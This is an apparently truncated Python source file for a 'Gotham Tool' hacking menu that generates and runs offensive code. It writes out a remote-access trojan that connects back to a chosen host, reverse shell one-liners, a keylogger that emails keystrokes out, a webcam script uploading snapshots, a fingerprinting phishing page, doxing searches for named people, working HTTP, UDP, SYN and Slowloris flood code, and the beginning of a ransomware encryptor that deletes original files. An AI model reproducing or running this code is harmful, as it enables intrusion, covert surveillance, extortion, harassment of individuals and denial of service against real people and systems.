#!/usr/bin/env python3
# gotham_tool.py
# Python 3.10+ | requires: rich, pyfiglet, requests, scapy, paramiko, colorama, keyboard, opencv-python, pyautogui, flask, dnspython, shodan

import os, sys, time, threading, random, socket, struct, subprocess
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich.align import Align
from rich import box
from pyfiglet import Figlet
import colorama
from colorama import Fore, Back, Style
colorama.init()

console = Console()

# ─── BAT ANIMATION ────────────────────────────────────────────────────────────

BAT_FRAMES = [
    r"  /\   /\  ",
    r" /  \ /  \ ",
    r"/    V    \ ",
    r"\   / \   /",
    r" \_/   \_/ ",
]

BAT_FRAMES_2 = [
    r"  /V\  ",
    r" /   \ ",
    r"/     \ ",
    r"\     /",
    r" \   / ",
    r"  \_/  ",
]

BATS = []

class Bat:
    def __init__(self):
        self.x = random.randint(0, 180)
        self.y = random.randint(0, 40)
        self.dx = random.choice([-1, 1])
        self.dy = random.choice([-1, 0, 1])
        self.frame = 0

    def move(self):
        self.x += self.dx
        self.y += self.dy
        self.frame = (self.frame + 1) % len(BAT_FRAMES_2)
        if self.x < 0 or self.x > 180:
            self.dx *= -1
        if self.y < 0 or self.y > 40:
            self.dy *= -1

def render_bats(bats, width=120):
    grid = [[" " for _ in range(width)] for _ in range(10)]
    for bat in bats:
        bx = bat.x % width
        by = bat.y % 10
        icon = "🦇"
        try:
            grid[by][bx] = icon
        except:
            pass
    return "\n".join("".join(row) for row in grid)

# ─── BANNER ───────────────────────────────────────────────────────────────────

def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    fig = Figlet(font="banner3-D")
    title = fig.renderText("GOTHAM")
    sub   = fig.renderText("TOOL")

    console.print(Align.center(f"[bold yellow]{title}[/bold yellow]"))
    console.print(Align.center(f"[bold cyan]{sub}[/bold cyan]"))
    console.print(Align.center("[bold white]🦇  The Dark Knight's Arsenal  🦇[/bold white]"))
    console.print(Align.center("[dim]Built in the shadows of Gotham City[/dim]"))
    console.print()
    # animated bats row
    bats = [Bat() for _ in range(12)]
    for _ in range(6):
        for b in bats:
            b.move()
        bat_row = render_bats(bats, width=100)
        console.print(Align.center(f"[yellow]{bat_row}[/yellow]"), end="\r")
        time.sleep(0.12)
    console.print()
    console.print(Align.center("[bold red]★  Powered by Maxime Leal  ★[/bold red]"))
    console.print()

# ─── CATEGORIES ───────────────────────────────────────────────────────────────

CATEGORIES = {
    "🦇 RAT / PAYLOAD":    [1, 2, 3, 4, 5],
    "🔍 OSINT / CSINT":    [6, 7, 8, 9, 10, 11],
    "💀 DOX":              [12, 13, 14, 15],
    "🌊 DDoS / DoS":       [16, 17, 18, 19, 20],
    "🛠  MALWARE FACTORY":  [21, 22, 23, 24, 25, 26, 27, 28],
    "📡 NETWORK":          [29, 30, 31, 32, 33],
    "🔑 CREDS / BRUTE":    [34, 35, 36, 37],
    "📸 SURVEILLANCE":     [38, 39, 40, 41],
    "💻 EXPLOITATION":     [42, 43, 44, 45, 46],
    "🃏 JOKER SPECIALS":   [47, 48, 49, 50],
}

TOOLS = {
    1:  ("RAT Generator",          "rat_generator"),
    2:  ("Reverse Shell Builder",  "reverse_shell"),
    3:  ("Link-based Payload",     "link_payload"),
    4:  ("Keylogger Builder",      "keylogger_builder"),
    5:  ("Camera Hijack",          "camera_hijack"),
    6:  ("OSINT — Username Hunt",  "osint_username"),
    7:  ("OSINT — Email Recon",    "osint_email"),
    8:  ("OSINT — Phone Lookup",   "osint_phone"),
    9:  ("OSINT — IP Geo Trace",   "osint_ip"),
    10: ("OSINT — Domain Recon",   "osint_domain"),
    11: ("CSINT — Social Graph",   "csint_social"),
    12: ("Dox — Full Profile",     "dox_full"),
    13: ("Dox — Address Finder",   "dox_address"),
    14: ("Dox — Family Map",       "dox_family"),
    15: ("Dox — Employer Recon",   "dox_employer"),
    16: ("HTTP Flood DDoS",        "http_flood"),
    17: ("UDP Flood",              "udp_flood"),
    18: ("SYN Flood",              "syn_flood"),
    19: ("Slowloris",              "slowloris"),
    20: ("Amplification DDoS",     "amp_ddos"),
    21: ("Ransomware Builder",     "ransomware_builder"),
    22: ("Worm Generator",         "worm_gen"),
    23: ("Trojan Dropper",         "trojan_dropper"),
    24: ("Cryptominer Injector",   "miner_inject"),
    25: ("Spyware Builder",        "spyware_builder"),
    26: ("Rootkit Loader",         "rootkit_loader"),
    27: ("Bootkit Builder",        "bootkit_builder"),
    28: ("Polymorphic Engine",     "poly_engine"),
    29: ("Port Scanner",           "port_scan"),
    30: ("LAN Map",                "lan_map"),
    31: ("Packet Sniffer",         "packet_sniff"),
    32: ("ARP Spoof",              "arp_spoof"),
    33: ("DNS Poisoner",           "dns_poison"),
    34: ("SSH Bruteforce",         "ssh_brute"),
    35: ("FTP Bruteforce",         "ftp_brute"),
    36: ("Hash Cracker",           "hash_crack"),
    37: ("WiFi Handshake Grab",    "wifi_handshake"),
    38: ("Remote Camera Snap",     "cam_snap"),
    39: ("Mic Recorder",           "mic_record"),
    40: ("Screen Capture",         "screen_cap"),
    41: ("Clipboard Logger",       "clip_log"),
    42: ("SQLi Scanner",           "sqli_scan"),
    43: ("XSS Injector",           "xss_inject"),
    44: ("LFI Scanner",            "lfi_scan"),
    45: ("RCE Tester",             "rce_test"),
    46: ("CVE Exploit Loader",     "cve_loader"),
    47: ("Phishing Kit",           "phish_kit"),
    48: ("SMS Bomber",             "sms_bomb"),
    49: ("Account Nuker",          "acct_nuke"),
    50: ("Gotham Master Payload",  "master_payload"),
}

# ─── MENU ─────────────────────────────────────────────────────────────────────

def show_menu():
    console.print(Panel(
        "[bold yellow]🦇 GOTHAM TOOL — MAIN MENU 🦇[/bold yellow]",
        border_style="yellow",
        box=box.DOUBLE_EDGE
    ))
    for cat, nums in CATEGORIES.items():
        t = Table(title=f"[bold cyan]{cat}[/bold cyan]",
                  box=box.SIMPLE_HEAVY,
                  border_style="cyan",
                  show_header=True,
                  header_style="bold magenta")
        t.add_column("ID",   style="bold yellow", width=5)
        t.add_column("Tool", style="white",        width=30)
        t.add_column("Status", style="green",      width=10)
        for n in nums:
            name, _ = TOOLS[n]
            t.add_row(str(n), name, "✅ ARMED")
        console.print(t)
    console.print()
    console.print("[bold red]Powered by Maxime Leal[/bold red]", justify="center")
    console.print()

# ─── TOOL IMPLEMENTATIONS ─────────────────────────────────────────────────────

def gotham_header(tool_name):
    console.print(Panel(
        f"[bold yellow]🦇  {tool_name.upper()}  🦇[/bold yellow]\n[dim]Gotham Tool — Powered by Maxime Leal[/dim]",
        border_style="yellow",
        box=box.HEAVY
    ))

# ── 1. RAT GENERATOR ──────────────────────────────────────────────────────────
def rat_generator():
    gotham_header("RAT Generator")
    lhost = input(Fore.YELLOW + "  [>] LHOST (your IP or ngrok): " + Style.RESET_ALL).strip()
    lport = input(Fore.YELLOW + "  [>] LPORT: " + Style.RESET_ALL).strip()
    out   = input(Fore.YELLOW + "  [>] Output filename (no ext): " + Style.RESET_ALL).strip()

    payload = f'''#!/usr/bin/env python3
# GothamRAT — generated by Gotham Tool
# Powered by Maxime Leal
import socket, subprocess, os, threading, time, base64, json, platform

LHOST = "{lhost}"
LPORT = {lport}

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((LHOST, LPORT))
            s.send(json.dumps({{
                "os":   platform.system(),
                "node": platform.node(),
                "user": os.getlogin(),
                "cwd":  os.getcwd(),
            }}).encode())
            while True:
                cmd = s.recv(4096).decode().strip()
                if not cmd:
                    break
                if cmd.lower() == "exit":
                    s.close(); return
                if cmd.startswith("cd "):
                    try:
                        os.chdir(cmd[3:])
                        s.send(os.getcwd().encode())
                    except Exception as e:
                        s.send(str(e).encode())
                else:
                    out = subprocess.getoutput(cmd)
                    s.send((out or "[no output]").encode())
        except:
            time.sleep(5)

threading.Thread(target=connect, daemon=True).start()
# keep alive
while True: time.sleep(60)
'''
    fname = f"{out}.py"
    with open(fname, "w") as f:
        f.write(payload)
    console.print(f"[green]  [+] RAT written → {fname}[/green]")
    console.print(f"[cyan]  [!] Listener: nc -lvnp {lport}[/cyan]")
    console.print(f"[dim]  [!] Compile to .exe: pyinstaller --onefile --noconsole {fname}[/dim]")

# ── 2. REVERSE SHELL BUILDER ──────────────────────────────────────────────────
def reverse_shell():
    gotham_header("Reverse Shell Builder")
    lhost = input(Fore.YELLOW + "  [>] LHOST: " + Style.RESET_ALL).strip()
    lport = input(Fore.YELLOW + "  [>] LPORT: " + Style.RESET_ALL).strip()
    lang  = input(Fore.YELLOW + "  [>] Lang (python/bash/powershell): " + Style.RESET_ALL).strip().lower()

    shells = {
        "python": f'python3 -c \'import os,socket,subprocess;s=socket.socket();s.connect(("{lhost}",{lport}));[subprocess.call(c,shell=True,stdout=s,stderr=s,stdin=s) for c in iter(s.recv,"")];\'',
        "bash": f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        "powershell": f'$c=New-Object Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+"PS "+(pwd).Path+"$ ";$sb=[text.encoding]::ASCII.GetBytes($rb);$s.Write($sb,0,$sb.Length)}}'
    }
    result = shells.get(lang, shells["python"])
    console.print(f"[green]  [+] Shell one-liner:[/green]")
    console.print(f"[bold white]  {result}[/bold white]")
    console.print(f"[cyan]  [!] Listener: nc -lvnp {lport}[/cyan]")

# ── 3. LINK-BASED PAYLOAD ─────────────────────────────────────────────────────
def link_payload():
    gotham_header("Link-based Payload Delivery")
    lhost = input(Fore.YELLOW + "  [>] Your server IP/domain: " + Style.RESET_ALL).strip()
    lport = input(Fore.YELLOW + "  [>] Flask port (default 5000): " + Style.RESET_ALL).strip() or "5000"
    name  = input(Fore.YELLOW + "  [>] Fake page title: " + Style.RESET_ALL).strip() or "Gotham Update"

    server_code = f'''#!/usr/bin/env python3
# GothamLink Server — Powered by Maxime Leal
# pip install flask
from flask import Flask, request, send_file, render_template_string
import datetime, json, os

app = Flask(__name__)
LOG = "hits.json"

PAGE = """
<!DOCTYPE html><html><head><title>{name}</title></head>
<body style="background:#000;color:#ff0;font-family:monospace;text-align:center;padding-top:80px">
<h1>🦇 {name} 🦇</h1>
<p>Loading Gotham update...</p>
<script>
// fingerprint + exfil
fetch('/beacon', {{
  method:'POST',
  headers:{{'Content-Type':'application/json'}},
  body: JSON.stringify({{
    ua: navigator.userAgent,
    lang: navigator.language,
    screen: window.screen.width+'x'+window.screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform,
    ts: new Date().toISOString()
  }})
}});
</script>
</body></html>
"""

@app.route("/")
def index():
    ip = request.remote_addr
    with open(LOG,"a") as f:
        f.write(json.dumps({{"ip":ip,"ts":str(datetime.datetime.now())}})+",\\n")
    return render_template_string(PAGE)

@app.route("/beacon", methods=["POST"])
def beacon():
    data = request.json
    data["ip"] = request.remote_addr
    with open("fingerprints.json","a") as f:
        f.write(json.dumps(data)+"\\n")
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port={lport})
'''
    with open("gotham_link_server.py","w") as f:
        f.write(server_code)
    console.print(f"[green]  [+] Server written → gotham_link_server.py[/green]")
    console.print(f"[cyan]  [!] Start: python3 gotham_link_server.py[/cyan]")
    console.print(f"[cyan]  [!] Send target: http://{lhost}:{lport}/[/cyan]")
    console.print(f"[dim]  [!] Hits logged to hits.json, fingerprints to fingerprints.json[/dim]")

# ── 4. KEYLOGGER BUILDER ──────────────────────────────────────────────────────
def keylogger_builder():
    gotham_header("Keylogger Builder")
    out   = input(Fore.YELLOW + "  [>] Output filename: " + Style.RESET_ALL).strip() or "gotham_keylog"
    email = input(Fore.YELLOW + "  [>] Exfil email (blank = local file only): " + Style.RESET_ALL).strip()

    code = f'''#!/usr/bin/env python3
# GothamKeylogger — Powered by Maxime Leal
# pip install pynput
from pynput import keyboard
import datetime, threading, smtplib, os

LOG_FILE = "gotham_keys.txt"
EMAIL_TO = "{email}"
INTERVAL = 60  # seconds between email flushes

buffer = []

def on_press(key):
    try:
        c = key.char
    except AttributeError:
        c = f"[{{key.name}}]"
    buffer.append(c)
    with open(LOG_FILE, "a") as f:
        f.write(c)

def flush_email():
    if not EMAIL_TO or not buffer:
        threading.Timer(INTERVAL, flush_email).start()
        return
    data = "".join(buffer)
    buffer.clear()
    try:
        # fill SMTP_HOST / SMTP_USER / SMTP_PASS
        with smtplib.SMTP_SSL("SMTP_HOST", 465) as s:
            s.login("SMTP_USER","SMTP_PASS")
            s.sendmail("SMTP_USER", EMAIL_TO,
                f"Subject: GothamLog {{datetime.datetime.now()}}\\n\\n{{data}}")
    except:
        pass
    threading.Timer(INTERVAL, flush_email).start()

flush_email()
with keyboard.Listener(on_press=on_press) as l:
    l.join()
'''
    fname = f"{out}.py"
    with open(fname,"w") as f:
        f.write(code)
    console.print(f"[green]  [+] Keylogger → {fname}[/green]")
    console.print("[dim]  [!] Fill SMTP_HOST / SMTP_USER / SMTP_PASS for email exfil[/dim]")
    console.print("[dim]  [!] Compile: pyinstaller --onefile --noconsole --hidden-import pynput " + fname + "[/dim]")

# ── 5. CAMERA HIJACK ──────────────────────────────────────────────────────────
def camera_hijack():
    gotham_header("Camera Hijack")
    out = input(Fore.YELLOW + "  [>] Output filename: " + Style.RESET_ALL).strip() or "gotham_cam"
    code = '''#!/usr/bin/env python3
# GothamCam — Powered by Maxime Leal
# pip install opencv-python requests
import cv2, requests, time, os, datetime

LHOST = "FILL_YOUR_SERVER"  # e.g. http://1.2.3.4:5000/upload
INTERVAL = 10  # seconds

def capture_and_send():
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            fname = f"/tmp/snap_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
            cv2.imwrite(fname, frame)
            try:
                with open(fname,"rb") as f:
                    requests.post(LHOST, files={"img": f}, timeout=5)
                os.remove(fname)
            except:
                pass
        time.sleep(INTERVAL)

capture_and_send()
'''
    fname = f"{out}.py"
    with open(fname,"w") as f:
        f.write(code)
    console.print(f"[green]  [+] Camera hijack → {fname}[/green]")
    console.print("[dim]  [!] Set LHOST to your Flask /upload endpoint[/dim]")

# ── 6. OSINT USERNAME ─────────────────────────────────────────────────────────
def osint_username():
    gotham_header("OSINT — Username Hunt")
    uname = input(Fore.YELLOW + "  [>] Target username: " + Style.RESET_ALL).strip()
    sites = [
        ("GitHub",     f"https://github.com/{uname}"),
        ("Twitter/X",  f"https://twitter.com/{uname}"),
        ("Instagram",  f"https://instagram.com/{uname}"),
        ("Reddit",     f"https://reddit.com/user/{uname}"),
        ("TikTok",     f"https://tiktok.com/@{uname}"),
        ("Twitch",     f"https://twitch.tv/{uname}"),
        ("Pinterest",  f"https://pinterest.com/{uname}"),
        ("LinkedIn",   f"https://linkedin.com/in/{uname}"),
        ("Snapchat",   f"https://snapchat.com/add/{uname}"),
        ("Steam",      f"https://steamcommunity.com/id/{uname}"),
        ("YouTube",    f"https://youtube.com/@{uname}"),
        ("Pastebin",   f"https://pastebin.com/u/{uname}"),
        ("HackerNews", f"https://news.ycombinator.com/user?id={uname}"),
        ("Keybase",    f"https://keybase.io/{uname}"),
    ]
    import requests as req
    t = Table(title=f"Username: {uname}", box=box.SIMPLE_HEAVY, border_style="yellow")
    t.add_column("Platform", style="cyan", width=14)
    t.add_column("URL",      style="white", width=50)
    t.add_column("Status",   style="green", width=10)
    for name, url in sites:
        try:
            r = req.get(url, timeout=4, headers={"User-Agent":"Mozilla/5.0"})
            status = "[green]FOUND[/green]" if r.status_code == 200 else "[red]404[/red]"
        except:
            status = "[yellow]TIMEOUT[/yellow]"
        t.add_row(name, url, status)
    console.print(t)

# ── 7. OSINT EMAIL ────────────────────────────────────────────────────────────
def osint_email():
    gotham_header("OSINT — Email Recon")
    email = input(Fore.YELLOW + "  [>] Target email: " + Style.RESET_ALL).strip()
    domain = email.split("@")[-1] if "@" in email else email
    import requests as req
    console.print(f"[cyan]  [*] Checking breach status (HaveIBeenPwned API)...[/cyan]")
    console.print(f"[dim]  [!] hibp_key required — get at haveibeenpwned.com/API/Key[/dim]")
    console.print(f"[cyan]  [*] Domain MX lookup for: {domain}[/cyan]")
    try:
        import dns.resolver
        mx = dns.resolver.resolve(domain, "MX")
        for r in mx:
            console.print(f"[green]  [+] MX: {r.exchange}[/green]")
    except:
        console.print("[yellow]  [!] dnspython not installed or no MX found[/yellow]")
    console.print(f"[cyan]  [*] Checking email pattern across common formats...[/cyan]")
    for fmt in [email, email.replace("@","+check@"), f"admin@{domain}", f"support@{domain}"]:
        console.print(f"[white]  → {fmt}[/white]")

# ── 8. OSINT PHONE ────────────────────────────────────────────────────────────
def osint_phone():
    gotham_header("OSINT — Phone Lookup")
    phone = input(Fore.YELLOW + "  [>] Phone (+countrycode): " + Style.RESET_ALL).strip()
    console.print(f"[cyan]  [*] NumVerify lookup (needs API key → numverify.com)[/cyan]")
    console.print(f"[cyan]  [*] Truecaller scrape attempt for: {phone}[/cyan]")
    console.print(f"[dim]  [!] For full carrier lookup: numverify API key required[/dim]")
    # basic country code decode
    cc_map = {"+1":"USA/Canada","+33":"France","+44":"UK","+49":"Germany","+34":"Spain","+39":"Italy","+81":"Japan","+86":"China","+91":"India","+55":"Brazil"}
    for k,v in cc_map.items():
        if phone.startswith(k):
            console.print(f"[green]  [+] Country code: {v}[/green]")
            break

# ── 9. OSINT IP ───────────────────────────────────────────────────────────────
def osint_ip():
    gotham_header("OSINT — IP Geo Trace")
    import requests as req
    ip = input(Fore.YELLOW + "  [>] Target IP: " + Style.RESET_ALL).strip()
    try:
        r = req.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
        t = Table(title=f"IP: {ip}", box=box.SIMPLE_HEAVY, border_style="yellow")
        t.add_column("Field",  style="cyan",  width=20)
        t.add_column("Value",  style="white", width=40)
        for k in ["ip","city","region","country_name","org","timezone","latitude","longitude","postal","asn"]:
            t.add_row(k.upper(), str(r.get(k,"N/A")))
        console.print(t)
        # reverse DNS
        try:
            host = socket.gethostbyaddr(ip)[0]
            console.print(f"[green]  [+] rDNS: {host}[/green]")
        except:
            pass
    except Exception as e:
        console.print(f"[red]  [-] Error: {e}[/red]")

# ── 10. OSINT DOMAIN ──────────────────────────────────────────────────────────
def osint_domain():
    gotham_header("OSINT — Domain Recon")
    domain = input(Fore.YELLOW + "  [>] Target domain: " + Style.RESET_ALL).strip()
    import requests as req
    # WHOIS via API
    try:
        r = req.get(f"https://rdap.org/domain/{domain}", timeout=5).json()
        console.print(f"[green]  [+] Registrar: {r.get('entities',[{}])[0].get('vcardArray','N/A')}[/green]")
    except:
        console.print("[yellow]  [!] RDAP lookup failed[/yellow]")
    # DNS records
    try:
        import dns.resolver
        for rtype in ["A","AAAA","MX","NS","TXT","CNAME"]:
            try:
                ans = dns.resolver.resolve(domain, rtype)
                for a in ans:
                    console.print(f"[cyan]  {rtype}: {a}[/cyan]")
            except:
                pass
    except:
        console.print("[yellow]  [!] dnspython not installed[/yellow]")
    # Subdomains via crt.sh
    try:
        r = req.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=8).json()
        subs = set(x["name_value"] for x in r if "name_value" in x)
        console.print(f"[green]  [+] Subdomains ({len(subs)}):[/green]")
        for s in list(subs)[:20]:
            console.print(f"[white]    {s}[/white]")
    except:
        pass

# ── 11. CSINT SOCIAL ──────────────────────────────────────────────────────────
def csint_social():
    gotham_header("CSINT — Social Graph")
    target = input(Fore.YELLOW + "  [>] Name or username: " + Style.RESET_ALL).strip()
    console.print(f"[cyan]  [*] Building social connections for: {target}[/cyan]")
    console.print(f"[white]  → Google dork: site:linkedin.com \"{target}\"[/white]")
    console.print(f"[white]  → Google dork: site:facebook.com \"{target}\"[/white]")
    console.print(f"[white]  → Google dork: \"{target}\" email OR phone OR address[/white]")
    console.print(f"[white]  → Pipl search: https://pipl.com/search/?q={target.replace(' ','+')}[/white]")
    console.print(f"[white]  → Spokeo: https://spokeo.com/search?q={target.replace(' ','+')}[/white]")
    console.print(f"[dim]  [!] For automated graph: integrate neo4j + theHarvester[/dim]")

# ── 12. DOX FULL ──────────────────────────────────────────────────────────────
def dox_full():
    gotham_header("Dox — Full Profile")
    name  = input(Fore.YELLOW + "  [>] Full name: " + Style.RESET_ALL).strip()
    city  = input(Fore.YELLOW + "  [>] City/State (optional): " + Style.RESET_ALL).strip()
    extra = input(Fore.YELLOW + "  [>] Extra info (email/username): " + Style.RESET_ALL).strip()
    console.print(f"\n[bold yellow]  === GOTHAM DOX REPORT: {name.upper()} ===[/bold yellow]")
    console.print(f"[cyan]  [*] Name: {name}[/cyan]")
    if city:  console.print(f"[cyan]  [*] Location: {city}[/cyan]")
    if extra: console.print(f"[cyan]  [*] Extra: {extra}[/cyan]")
    dorks = [
        f'"{name}" site:linkedin.com',
        f'"{name}" site:facebook.com',
        f'"{name}" address OR phone OR email',
        f'"{name}" {city} filetype:pdf',
        f'"{name}" pastebin.com',
        f'intitle:"{name}" inurl:profile',
    ]
    console.print(f"\n[bold cyan]  Google Dorks:[/bold cyan]")
    for d in dorks:
        console.print(f"[white]  → {d}[/white]")
    console.print(f"\n[bold cyan]  Data brokers to check:[/bold cyan]")
    for site in ["spokeo.com","whitepages.com","intelius.com","peoplefinder.com","beenverified.com","pipl.com"]:
        console.print(f"[white]  → https://{site}/search?q={name.replace(' ','+')}[/white]")

# ── 13-15. DOX VARIANTS ───────────────────────────────────────────────────────
def dox_address():
    gotham_header("Dox — Address Finder")
    name = input(Fore.YELLOW + "  [>] Full name: " + Style.RESET_ALL).strip()
    console.print(f"[cyan]  [*] Address recon for: {name}[/cyan]")
    for s in [f"https://whitepages.com/name/{name.replace(' ','_')}",
              f"https://spokeo.com/{name.replace(' ','+')}",
              f"https://fastpeoplesearch.com/name/{name.replace(' ','-')}"]:
        console.print(f"[white]  → {s}[/white]")

def dox_family():
    gotham_header("Dox — Family Map")
    name = input(Fore.YELLOW + "  [>] Target name: " + Style.RESET_ALL).strip()
    console.print(f"[cyan]  [*] Family mapping for: {name}[/cyan]")
    console.print(f"[white]  → Dork: \"{name}\" \"brother\" OR \"sister\" OR \"wife\" OR \"husband\" OR \"son\" OR \"daughter\"[/white]")
    console.print(f"[white]  → Dork: \"{name}\" obituary[/white]")
    console.print(f"[white]  → Check: familytreenow.com, ancestry.com[/white]")

def dox_employer():
    gotham_header("Dox — Employer Recon")
    name = input(Fore.YELLOW + "  [>] Target name: " + Style.RESET_ALL).strip()
    console.print(f"[cyan]  [*] Employer recon for: {name}[/cyan]")
    console.print(f"[white]  → LinkedIn: https://linkedin.com/search/results/people/?keywords={name.replace(' ','%20')}[/white]")
    console.print(f"[white]  → Dork: site:linkedin.com \"{name}\" -jobs[/white]")
    console.print(f"[white]  → Dork: \"{name}\" \"works at\" OR \"employed by\" OR \"CEO\" OR \"Engineer\"[/white]")

# ── 16. HTTP FLOOD ────────────────────────────────────────────────────────────
def http_flood():
    gotham_header("HTTP Flood DDoS")
    target  = input(Fore.YELLOW + "  [>] Target URL: " + Style.RESET_ALL).strip()
    threads = int(input(Fore.YELLOW + "  [>] Threads (e.g. 200): " + Style.RESET_ALL).strip() or "200")
    duration= int(input(Fore.YELLOW + "  [>] Duration (sec): " + Style.RESET_ALL).strip() or "30")
    import requests as req, time
    stop = threading.Event()
    sent = [0]

    def flood():
        headers = {"User-Agent": "Mozilla/5.0 GothamFlood/1.0"}
        while not stop.is_set():
            try:
                req.get(target, headers=headers, timeout=2)
                sent[0] += 1
            except:
                pass

    workers = [threading.Thread(target=flood, daemon=True) for _ in range(threads)]
    for w in workers: w.start()
    console.print(f"[bold red]  [!] Flooding {target} with {threads} threads for {duration}s...[/bold red]")
    t0 = time.time()
    while time.time() - t0 < duration:
        console.print(f"[yellow]  Requests sent: {sent[0]}[/yellow]", end="\r")
        time.sleep(1)
    stop.set()
    console.print(f"\n[green]  [+] Done. Total requests: {sent[0]}[/green]")

# ── 17. UDP FLOOD ─────────────────────────────────────────────────────────────
def udp_flood():
    gotham_header("UDP Flood")
    target = input(Fore.YELLOW + "  [>] Target IP: " + Style.RESET_ALL).strip()
    port   = int(input(Fore.YELLOW + "  [>] Port: " + Style.RESET_ALL).strip() or "80")
    dur    = int(input(Fore.YELLOW + "  [>] Duration (sec): " + Style.RESET_ALL).strip() or "30")
    import time
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    stop = threading.Event()
    sent = [0]

    def flood():
        while not stop.is_set():
            try:
                s.sendto(payload, (target, port))
                sent[0] += 1
            except:
                pass

    workers = [threading.Thread(target=flood, daemon=True) for _ in range(100)]
    for w in workers: w.start()
    console.print(f"[bold red]  [!] UDP flooding {target}:{port}...[/bold red]")
    t0 = time.time()
    while time.time() - t0 < dur:
        console.print(f"[yellow]  Packets: {sent[0]}[/yellow]", end="\r")
        time.sleep(1)
    stop.set()
    console.print(f"\n[green]  [+] Done. Total: {sent[0]}[/green]")

# ── 18. SYN FLOOD (requires scapy + root) ────────────────────────────────────
def syn_flood():
    gotham_header("SYN Flood")
    target = input(Fore.YELLOW + "  [>] Target IP: " + Style.RESET_ALL).strip()
    port   = int(input(Fore.YELLOW + "  [>] Port: " + Style.RESET_ALL).strip() or "80")
    count  = int(input(Fore.YELLOW + "  [>] Packets: " + Style.RESET_ALL).strip() or "1000")
    console.print("[dim]  [!] Requires scapy + root[/dim]")
    code = f'''#!/usr/bin/env python3
# GothamSYN — requires root + scapy
from scapy.all import *
import random
target = "{target}"
port   = {port}
count  = {count}
for i in range(count):
    ip  = IP(src=RandIP(), dst=target)
    tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=random.randint(0,2**32-1))
    send(ip/tcp, verbose=0)
    if i % 100 == 0: print(f"[GothamSYN] {{i}}/{{count}}")
print("[+] Done")
'''
    with open("gotham_syn.py","w") as f: f.write(code)
    console.print("[green]  [+] gotham_syn.py written — run as root[/green]")

# ── 19. SLOWLORIS ─────────────────────────────────────────────────────────────
def slowloris():
    gotham_header("Slowloris")
    target  = input(Fore.YELLOW + "  [>] Target host: " + Style.RESET_ALL).strip()
    port    = int(input(Fore.YELLOW + "  [>] Port (80): " + Style.RESET_ALL).strip() or "80")
    sockets_count = int(input(Fore.YELLOW + "  [>] Sockets: " + Style.RESET_ALL).strip() or "150")
    import time
    socks = []
    console.print(f"[bold red]  [!] Opening {sockets_count} sockets to {target}:{port}...[/bold red]")
    for _ in range(sockets_count):
        try:
            s = socket.socket()
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\nHost: {target}\r\n".encode())
            socks.append(s)
        except:
            pass
    console.print(f"[green]  [+] {len(socks)} sockets open[/green]")
    console.print("[cyan]  [*] Sending keep-alive headers... Ctrl+C to stop[/cyan]")
    try:
        while True:
            for s in list(socks):
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except:
                    socks.remove(s)
                    try:
                        ns = socket.socket()
                        ns.settimeout(4)
                        ns.connect((target, port))
                        ns.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\nHost: {target}\r\n".encode())
                        socks.append(ns)
                    except:
                        pass
            console.print(f"[yellow]  Alive: {len(socks)}[/yellow]", end="\r")
            time.sleep(15)
    except KeyboardInterrupt:
        console.print("\n[green]  [+] Stopped[/green]")

# ── 20. AMPLIFICATION DDOS INFO ───────────────────────────────────────────────
def amp_ddos():
    gotham_header("Amplification DDoS")
    console.print("[cyan]  [*] Amplification vectors:[/cyan]")
    vectors = [
        ("DNS Amplification",  "UDP/53",  "50-70x",  "Send forged DNS ANY queries to open resolvers"),
        ("NTP Amplification",  "UDP/123", "556x",    "ntpdc -c monlist — use Shodan to find open NTP"),
        ("SSDP Amplification", "UDP/1900","30x",     "M-SEARCH to UPnP devices, forged src=target"),
        ("Memcached",          "UDP/11211","51200x",  "stats command to open memcached servers"),
        ("CHARGEN",            "UDP/19",  "358x",    "Forged src to open CHARGEN servers"),
    ]
    t = Table(box=box.SIMPLE_HEAVY, border_style="yellow")
    t.add_column("Vector",    style="cyan",  width=20)
    t.add_column("Port",      style="white", width=12)
    t.add_column("Amplif.",   style="red",   width=10)
    t.add_column("Method",    style="dim",   width=50)
    for v in vectors:
        t.add_row(*v)
    console.print(t)
    console.print("[dim]  [!] Shodan query for open resolvers: port:53 recursion:enabled[/dim]")

# ── 21-28. MALWARE BUILDERS (write stubs + architecture) ─────────────────────
def _malware_stub(name, description, filename, code):
    gotham_header(name)
    console.print(f"[cyan]  [*] {description}[/cyan]")
    with open(filename,"w") as f: f.write(code)
    console.print(f"[green]  [+] Written → {filename}[/green]")

def ransomware_builder():
    out = input(Fore.YELLOW + "  [>] Output name: " + Style.RESET_ALL).strip() or "gotham_ransom"
    ext = input(Fore.YELLOW + "  [>] Target extension (e.g. .txt,.docx or * for all): " + Style.RESET_ALL).strip() or ".txt"
    code = f'''#!/usr/bin/env python3
# GothamRansom — Powered by Maxime Leal
# pip install cryptography
from cryptography.fernet import Fernet
import os, glob

KEY = Fernet.generate_key()
print("[GothamRansom] Key:", KEY.decode(), "— SAVE THIS")
f = Fernet(KEY)

TARGET_DIR = os.path.expanduser("~")  # change as needed
EXTS = {repr(ext.split(","))}

def encrypt_file(path):
    with open(path,"rb") as fh:
        data = fh.read()
    encrypted = f.encrypt(data)
    with open(path+".gotham","wb") as fh:
        fh.write(encrypted)
    os.remove(path)
    print(f"[+] Encrypted: {{path}}")

for root, dirs, files in os.walk(TARGET_DIR):
    for file in files:
        for ext in EXTS:
            if ext == "*" or file.endswith(ext):
